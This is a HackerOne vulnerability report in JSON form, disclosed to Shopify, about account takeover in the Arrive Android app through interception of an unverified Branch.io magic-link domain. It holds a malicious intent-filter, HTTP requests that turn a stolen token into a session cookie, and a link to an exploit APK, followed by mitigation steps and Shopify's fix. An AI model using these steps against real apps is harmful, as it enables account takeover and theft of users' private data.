{"id":855618,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTU2MTg=","url":"https://hackerone.com/reports/855618","title":"Account takeover intercepting magic link for Arrive app","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-04-22T01:06:10.829Z","submitted_at":"2020-04-22T01:06:10.829Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nsl182","url":"/nsl182","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-15T21:30:26.324Z","bug_reporter_agreed_on_going_public_at":"2020-07-15T21:30:26.158Z","team_member_agreed_on_going_public_at":"2020-07-06T15:53:20.003Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nThe \"magic link\" used for login by Arrive app uses Branch.io to pass the login token via deeplink to the app. But the URL contained in the link (app.link domain) is not verified so it can be intercepted by a malicious app at takeover the account.\n\n### Description\n\nWhen trying to login with Arrive app the user needs to request a login email to continue the login process. The user receives an email with a button to \"Confirm the Email Address\" that point to an URL of this kind:\n\nhttps://qvay.app.link/R3DvpIJKtR?%24uri_redirect_mode=2\u0026token=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\u0026secret=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\n\nThis URL belong to branch.io and it will generate a chrome deeplink that will open Arrive app passing the token (visible in the URL) and continue the login flow.\n\nThis domain (qvay.app.link) is not verified by the app via App Link, so it can be listened by any malicious app when a use tries to open a link to it.\n\nYou can see that the `assetlinks.json` of that domain is empty: https://qvay.app.link/.well-known/assetlinks.json\nIt can be configured to prevent these type of attacks. More info here: https://help.branch.io/using-branch/docs/android-app-links\n\n### Exploit\n\nA malicious app can create an `intent-filter` to listen to that domain like this:\n\n```\n\u003cintent-filter\u003e\n\t\u003caction android:name=\"android.intent.action.VIEW\" /\u003e\n\t\u003ccategory android:name=\"android.intent.category.DEFAULT\" /\u003e\n\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\" /\u003e\n\t\u003cdata android:scheme=\"https\" /\u003e\n\t\u003cdata android:host=\"qvay.app.link\" /\u003e\n\u003c/intent-filter\u003e\n```\n\nAfter the link is intercepted, we have a token we can Verify in order to get a `_arrive-server_session` cookie\n\nFor this we can do a POST request similar to this:\n\n```\nPOST /graphql HTTP/1.1\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: _arrive-server_session=2a969ef15e1cc286ca6c5a88433d7173\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)\nHost: arrive-server.shopifycloud.com\nConnection: close\nContent-Length: 346\n\n{\"operationName\":\"VerifyToken\",\"variables\":{\"token\":\"TOKENHERE\"},\"query\":\"mutation VerifyToken($token: String!) {\\n  verifyToken(token: $token) {\\n    user {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\nThe response will include a valid `_arrive-server_session` cookie we can use to access other parts of the app and pretty much taking over the account.\n\n### Bonus\n\nThe malicious app doesn't even have to wait for the user to request a login email, it can trigger it by itself (considering it know the emails, but thats doable checking the email accounts of the phone via Android SDK)\n\nTo request an email the malicious app can request this way:\n\n```\nPOST /graphql HTTP/1.1\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)\nHost: arrive-server.shopifycloud.com\nConnection: close\nContent-Length: 293\n\n{\"operationName\":\"SendVerificationEmail\",\"variables\":{\"email\":\"EMAILHERE\"},\"query\":\"mutation SendVerificationEmail($email: String!) {\\n  sendVerificationEmail(email: $email) {\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\nNot only it will create the email, but also will give us a `_arrive-server_session` cookie in the response that we can use for the previous step when we are validating the token.\n\n### Mitigation\n\nIn order to prevent a malicious app to take advantage of this exploit it will require to implement the App Links  verification for the `http://qvay.app.link` domain, and verify that link in the `AndroidManifest.xml` of the app. Steps are here: https://help.branch.io/using-branch/docs/android-app-links\n\n### PoC and Video\n\nAttached can be found a video where i explain both scenarios:\n- User requests email via Arrive app and the malicious app intercepts the link opening and obtains a valid session cookie\n- Malicious app requests the email and intercepts the link when the user finally opens it. \n\nAlso attached is the `.apk` of the \"malicious\" app i used as PoC and for the video. Can provide sources if needed, but pretty much all the requests i'm making are explained here.\n\n#### Reference material\nhttps://www.nowsecure.com/blog/2019/04/05/how-to-guard-against-mobile-app-deep-link-abuse/\nhttps://developer.android.com/training/app-links/verify-site-associations\n\n## Impact\n\nThe account is compromised and the malicious app can potentially access private data like location, etc...","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eThe \u0026quot;magic link\u0026quot; used for login by Arrive app uses Branch.io to pass the login token via deeplink to the app. But the URL contained in the link (app.link domain) is not verified so it can be intercepted by a malicious app at takeover the account.\u003c/p\u003e\n\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\n\u003cp\u003eWhen trying to login with Arrive app the user needs to request a login email to continue the login process. The user receives an email with a button to \u0026quot;Confirm the Email Address\u0026quot; that point to an URL of this kind:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://qvay.app.link/R3DvpIJKtR?%24uri_redirect_mode=2\u0026amp;token=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\u0026amp;secret=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\" href=\"/redirect?url=https%3A%2F%2Fqvay.app.link%2FR3DvpIJKtR%3F%2524uri_redirect_mode%3D2%26token%3DFdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa%26secret%3DFdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://qvay.app.link/R3DvpIJKtR?%24uri_redirect_mode=2\u0026amp;token=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\u0026amp;secret=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis URL belong to branch.io and it will generate a chrome deeplink that will open Arrive app passing the token (visible in the URL) and continue the login flow.\u003c/p\u003e\n\n\u003cp\u003eThis domain (qvay.app.link) is not verified by the app via App Link, so it can be listened by any malicious app when a use tries to open a link to it.\u003c/p\u003e\n\n\u003cp\u003eYou can see that the \u003ccode\u003eassetlinks.json\u003c/code\u003e of that domain is empty: \u003ca title=\"https://qvay.app.link/.well-known/assetlinks.json\" href=\"/redirect?url=https%3A%2F%2Fqvay.app.link%2F.well-known%2Fassetlinks.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://qvay.app.link/.well-known/assetlinks.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nIt can be configured to prevent these type of attacks. More info here: \u003ca title=\"https://help.branch.io/using-branch/docs/android-app-links\" href=\"/redirect?url=https%3A%2F%2Fhelp.branch.io%2Fusing-branch%2Fdocs%2Fandroid-app-links\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://help.branch.io/using-branch/docs/android-app-links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"exploit\"\u003eExploit\u003c/h3\u003e\n\n\u003cp\u003eA malicious app can create an \u003ccode\u003eintent-filter\u003c/code\u003e to listen to that domain like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;intent-filter\u0026gt;\n    \u0026lt;action android:name=\u0026quot;android.intent.action.VIEW\u0026quot; /\u0026gt;\n    \u0026lt;category android:name=\u0026quot;android.intent.category.DEFAULT\u0026quot; /\u0026gt;\n    \u0026lt;category android:name=\u0026quot;android.intent.category.BROWSABLE\u0026quot; /\u0026gt;\n    \u0026lt;data android:scheme=\u0026quot;https\u0026quot; /\u0026gt;\n    \u0026lt;data android:host=\u0026quot;qvay.app.link\u0026quot; /\u0026gt;\n\u0026lt;/intent-filter\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter the link is intercepted, we have a token we can Verify in order to get a \u003ccode\u003e_arrive-server_session\u003c/code\u003e cookie\u003c/p\u003e\n\n\u003cp\u003eFor this we can do a POST request similar to this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /graphql HTTP/1.1\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: _arrive-server_session=2a969ef15e1cc286ca6c5a88433d7173\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)\nHost: arrive-server.shopifycloud.com\nConnection: close\nContent-Length: 346\n\n{\u0026quot;operationName\u0026quot;:\u0026quot;VerifyToken\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;token\u0026quot;:\u0026quot;TOKENHERE\u0026quot;},\u0026quot;query\u0026quot;:\u0026quot;mutation VerifyToken($token: String!) {\\n  verifyToken(token: $token) {\\n    user {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe response will include a valid \u003ccode\u003e_arrive-server_session\u003c/code\u003e cookie we can use to access other parts of the app and pretty much taking over the account.\u003c/p\u003e\n\n\u003ch3 id=\"bonus\"\u003eBonus\u003c/h3\u003e\n\n\u003cp\u003eThe malicious app doesn\u0026#39;t even have to wait for the user to request a login email, it can trigger it by itself (considering it know the emails, but thats doable checking the email accounts of the phone via Android SDK)\u003c/p\u003e\n\n\u003cp\u003eTo request an email the malicious app can request this way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /graphql HTTP/1.1\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)\nHost: arrive-server.shopifycloud.com\nConnection: close\nContent-Length: 293\n\n{\u0026quot;operationName\u0026quot;:\u0026quot;SendVerificationEmail\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;email\u0026quot;:\u0026quot;EMAILHERE\u0026quot;},\u0026quot;query\u0026quot;:\u0026quot;mutation SendVerificationEmail($email: String!) {\\n  sendVerificationEmail(email: $email) {\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot only it will create the email, but also will give us a \u003ccode\u003e_arrive-server_session\u003c/code\u003e cookie in the response that we can use for the previous step when we are validating the token.\u003c/p\u003e\n\n\u003ch3 id=\"mitigation\"\u003eMitigation\u003c/h3\u003e\n\n\u003cp\u003eIn order to prevent a malicious app to take advantage of this exploit it will require to implement the App Links  verification for the \u003ccode\u003ehttp://qvay.app.link\u003c/code\u003e domain, and verify that link in the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e of the app. Steps are here: \u003ca title=\"https://help.branch.io/using-branch/docs/android-app-links\" href=\"/redirect?url=https%3A%2F%2Fhelp.branch.io%2Fusing-branch%2Fdocs%2Fandroid-app-links\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://help.branch.io/using-branch/docs/android-app-links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"poc-and-video\"\u003ePoC and Video\u003c/h3\u003e\n\n\u003cp\u003eAttached can be found a video where i explain both scenarios:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUser requests email via Arrive app and the malicious app intercepts the link opening and obtains a valid session cookie\u003c/li\u003e\n\u003cli\u003eMalicious app requests the email and intercepts the link when the user finally opens it. \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAlso attached is the \u003ccode\u003e.apk\u003c/code\u003e of the \u0026quot;malicious\u0026quot; app i used as PoC and for the video. Can provide sources if needed, but pretty much all the requests i\u0026#39;m making are explained here.\u003c/p\u003e\n\n\u003ch4 id=\"reference-material\"\u003eReference material\u003c/h4\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.nowsecure.com/blog/2019/04/05/how-to-guard-against-mobile-app-deep-link-abuse/\" href=\"/redirect?url=https%3A%2F%2Fwww.nowsecure.com%2Fblog%2F2019%2F04%2F05%2Fhow-to-guard-against-mobile-app-deep-link-abuse%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.nowsecure.com/blog/2019/04/05/how-to-guard-against-mobile-app-deep-link-abuse/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://developer.android.com/training/app-links/verify-site-associations\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fapp-links%2Fverify-site-associations\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.android.com/training/app-links/verify-site-associations\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe account is compromised and the malicious app can potentially access private data like location, etc...\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":87,"name":"Insufficiently Protected Credentials"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":798475,"file_name":"arrive-exploit.apk","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x1wvYkaBfTzJFmiTEdmtc1f2?response-content-disposition=attachment%3B%20filename%3D%22arrive-exploit.apk%22%3B%20filename%2A%3DUTF-8%27%27arrive-exploit.apk\u0026response-content-type=application%2Fvnd.android.package-archive\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070209Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=9b05b1563b6c09f7b606d6f1216954741121cf840656d6dda551dd5f23aa59b5","file_size":2511158,"type":"application/vnd.android.package-archive"},{"id":798477,"file_name":"arrive.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LpKqfmcKcEXSTQ1C9h64N46z?response-content-disposition=attachment%3B%20filename%3D%22arrive.mp4%22%3B%20filename%2A%3DUTF-8%27%27arrive.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070209Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=2061be6eebda85af776865f4818d6ab610b8aea2e99be9164d97c5dacab5ca22","file_size":50249065,"type":"video/mp4"}],"allow_singular_disclosure_at":null,"vote_count":15,"voters":["mik317","johndoe1492","mygf","leonishan","ar-arvind","trazer","what_web","its_afolic","b69fb2ebda43240ece9dbeb","katy1912","and 5 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":37199,"asset_type":"OTHER","asset_identifier":"Shopify Mobile Applications","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7759718,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @nsl182, Thank you for your report! We were able to reproduce the issue and our team is working on a fix.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/nsl182\"\u003e@nsl182\u003c/a\u003e, Thank you for your report! We were able to reproduce the issue and our team is working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-22T21:15:58.019Z","updated_at":"2020-04-22T21:15:58.019Z","actor":{"username":"michael_hughes","cleared":false,"url":"/michael_hughes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7773024,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for the report. We've decided to award a $500 bounty for this report. We'll be in touch again once the issue is resolved.","markdown_message":"\u003cp\u003eThanks again for the report. We\u0026#39;ve decided to award a $500 bounty for this report. We\u0026#39;ll be in touch again once the issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-23T20:11:13.728Z","updated_at":"2020-04-23T20:11:13.728Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"nsl182","url":"/nsl182"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7773046,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the reward :)","markdown_message":"\u003cp\u003eThanks for the reward :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-23T20:13:54.871Z","updated_at":"2020-04-23T20:13:54.871Z","actor":{"username":"nsl182","cleared":false,"url":"/nsl182","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7914093,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T15:26:52.132Z","updated_at":"2020-05-06T15:26:52.132Z","additional_data":{"duplicate_report_id":867105},"actor":{"username":"bigbug","cleared":false,"url":"/bigbug","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/193/109/585fd367d9fe6feb8fb35840fdadb04d16004b0b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8516228,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @nsl182, we've made two changes to resolve this issue:\n\n1) Enabled App Links so another third party application can't intercept the link\n2) Added server-side validation so that the code sent by the client when requesting the email is the same code sent by the client when opening the link from the email. This makes it so the link can only be used by the same client which made the initial request.\n\nThank you for helping to improve the security of Shopify!","markdown_message":"\u003cp\u003eHello \u003ca href=\"/nsl182\"\u003e@nsl182\u003c/a\u003e, we\u0026#39;ve made two changes to resolve this issue:\u003c/p\u003e\n\n\u003cp\u003e1) Enabled App Links so another third party application can\u0026#39;t intercept the link\u003cbr\u003e\n2) Added server-side validation so that the code sent by the client when requesting the email is the same code sent by the client when opening the link from the email. This makes it so the link can only be used by the same client which made the initial request.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping to improve the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-06T15:51:37.545Z","updated_at":"2020-07-06T15:51:37.545Z","actor":{"username":"michael_hughes","cleared":false,"url":"/michael_hughes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"nsl182","url":"/nsl182"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8516244,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-06T15:53:20.027Z","updated_at":"2020-07-06T15:53:20.027Z","first_to_agree":true,"actor":{"username":"michael_hughes","cleared":false,"url":"/michael_hughes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8600151,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-14T21:28:27.282Z","updated_at":"2020-07-14T21:28:27.282Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":699268,"new_severity_id":779837},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8612460,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Great! :) ","markdown_message":"\u003cp\u003eGreat! :) \u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-15T21:30:26.186Z","updated_at":"2020-07-15T21:30:26.186Z","actor":{"username":"nsl182","cleared":false,"url":"/nsl182","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8612461,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-15T21:30:26.359Z","updated_at":"2020-07-15T21:30:26.359Z","actor":{"username":"nsl182","cleared":false,"url":"/nsl182","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}